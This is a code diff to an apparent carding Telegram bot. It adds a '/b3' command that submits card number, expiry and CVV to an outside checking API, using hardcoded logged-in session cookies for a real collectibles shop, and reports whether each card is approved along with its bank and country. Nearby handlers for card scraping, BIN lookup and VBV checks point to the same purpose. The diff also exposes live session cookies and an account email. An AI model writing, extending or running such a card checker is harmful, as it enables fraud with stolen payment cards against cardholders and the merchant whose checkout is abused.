@@ -4161,6 +4161,79 @@ async def scrap_cards_background(channel, amount, user_id, chat_id, bot, progres
 
 
 
+import aiohttp
+import re
+from telegram import Update
+from telegram.ext import ContextTypes, CommandHandler
+
+# === CONFIG ===
+API_URL = "https://autob3cookies.onrender.com/key=Xcracker911/autob3"
+SITE = "https://apluscollectibles.com"
+
+# put your full cookies string here
+COOKIES = "_ga_D1Q49TMJ2C=GS2.1.s1757220818$o7$g0$t1757220818$j60$l0$h0;wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b=xcrasjwiiwjwr663%7C1758272921%7CBPf39ptFyvGAQ34Dn1nIXF1fvcY5spDCUhlsfKA1Wp4%7C301e75542869a8a7dbbcf88f245dddf67e40a88c925b8b137785ca10d8f0c986;sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;cfz_google-analytics_v4=%7B%22uoEf_engagementDuration%22%3A%7B%22v%22%3A%220%22%2C%22e%22%3A1788756819052%7D%2C%22uoEf_engagementStart%22%3A%7B%22v%22%3A%221757220819052%22%2C%22e%22%3A1788756819052%7D%2C%22uoEf_counter%22%3A%7B%22v%22%3A%2243%22%2C%22e%22%3A1788756819052%7D%2C%22uoEf_session_counter%22%3A%7B%22v%22%3A%228%22%2C%22e%22%3A1788756819052%7D%2C%22uoEf_ga4%22%3A%7B%22v%22%3A%220486ee08-be8c-416f-a2a9-e6cc9b586a2c%22%2C%22e%22%3A1788756819052%7D%2C%22uoEf__z_ga_audiences%22%3A%7B%22v%22%3A%220486ee08-be8c-416f-a2a9-e6cc9b586a2c%22%2C%22e%22%3A1788099028638%7D%2C%22uoEf_let%22%3A%7B%22v%22%3A%221757220819052%22%2C%22e%22%3A1788756819052%7D%2C%22uoEf_ga4sid%22%3A%7B%22v%22%3A%221807422450%22%2C%22e%22%3A1757222619052%7D%7D;wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f=9023%7Cother%7Cread%7C5ad6eca7c2a7a49651f38d465011c7ae8f8529e64b49ffad8bc1527e1540360d;sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F;mailchimp_user_email=xcrasjwiiwjwr663%40gmail.com;sbjs_migrations=1418474375998%3D1;mailchimp_user_previous_email=xcrasjwiiwjwr663%40gmail.com;Subscribe=true;sbjs_first_add=fd%3D2025-09-07%2004%3A23%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29;_ga=GA1.1.1082691390.1756563029;_gcl_au=1.1.1821381797.1756563029;breeze_folder_name=6bae3cd94ddbfe28435ae88815e64956a5198266;cfzs_google-analytics_v4=%7B%22uoEf_pageviewCounter%22%3A%7B%22v%22%3A%221%22%7D%7D;dfehc_user=f9046e64c7ce9c01a633953b208018fe;mailchimp_landing_site=https%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F;sbjs_current_add=fd%3D2025-09-07%2004%3A23%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29;sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29;sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36"
+
+
+# === /b3 COMMAND ===
+async def b3_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await update.message.reply_text("⚠️ Usage:\n/b3 card|mm|yy|cvv")
+        return
+
+    card = context.args[0].strip()
+    url = f"{API_URL}?site={SITE}&cookies={COOKIES}&cc={card}"
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, timeout=60) as resp:
+                text = await resp.text()
+    except Exception as e:
+        await update.message.reply_text(f"❌ API error: {e}")
+        return
+
+    # --- Extract values from API response ---
+    status_match = re.search(r"(APPROVED ✅|DECLINED ❌)", text)
+    gateway_match = re.search(r"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ (.+)", text)
+    response_match = re.search(r"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ (.+)", text)
+    bin_match = re.search(r"𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: (.+)", text)
+    bank_match = re.search(r"𝗕𝗮𝗻𝗸: (.+)", text)
+    country_match = re.search(r"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: (.+)", text)
+
+    status = status_match.group(1) if status_match else "UNKNOWN"
+    gateway = gateway_match.group(1).strip() if gateway_match else "UNKNOWN"
+    response_msg = response_match.group(1).strip() if response_match else "UNKNOWN"
+
+    brand = "UNKNOWN"
+    if bin_match:
+        parts = bin_match.group(1).split("-")
+        if parts:
+            brand = parts[0].strip().title()
+
+    bank = bank_match.group(1).strip() if bank_match else "UNKNOWN"
+    country = country_match.group(1).strip() if country_match else "UNKNOWN"
+
+    # --- Format stylish output ---
+    result = f"""═══[ {status} ]═══
+[⌇] 𝐂𝐚𝐫𝐝       ➜ {card}
+[⌇] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➜ {gateway}
+
+[⌇] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➜ {response_msg}
+――――――――――――――――
+[⌇] 𝐁𝐫𝐚𝐧𝐝      ➜ {brand}
+[⌇] 𝐁𝐚𝐧𝐤       ➜ {bank}
+[⌇] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲    ➜ {country}
+――――――――――――――――
+[⌇] 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {update.effective_user.first_name}
+[⌇] 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ kคli liຖนxx
+――――――――――――――――"""
+
+    await update.message.reply_text(result)
+
+# === Register command ===
+
+
+
+
 # --- Imports ---
 import aiohttp
 import asyncio
@@ -5057,6 +5130,7 @@ def main():
     application.add_handler(CommandHandler("bin", command_with_check(bin_lookup, "bin")))
     application.add_handler(CommandHandler("fk", command_with_check(fk_command, "fk")))
     application.add_handler(CommandHandler("scr", command_with_check(scrap_command, "scr")))
+    application.add_handler(CommandHandler("b3", b3_handler))
     application.add_handler(CommandHandler("vbv", vbv))
     application.add_handler(CommandHandler("fl", command_with_check(fl_command, "fl")))
     application.add_handler(CommandHandler("status", command_with_check(status_command, "status")))
